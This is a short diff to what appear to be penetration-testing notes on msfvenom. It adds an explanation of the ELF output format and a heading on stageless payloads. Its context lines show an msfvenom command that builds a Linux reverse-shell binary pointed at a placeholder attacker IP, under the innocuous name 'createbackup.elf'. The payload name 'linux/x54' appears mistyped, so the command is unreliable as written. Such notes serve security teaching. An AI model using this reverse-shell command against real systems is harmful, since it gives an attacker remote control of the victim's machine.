@@ -35,4 +35,7 @@ msfvenom -f payloads
 ```bash
 msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createbackup.elf
 ```
-- `-f`
+- `-f elf` is the format of the generated binary we will be in
+
+---
+## Executing a Stageless Payload
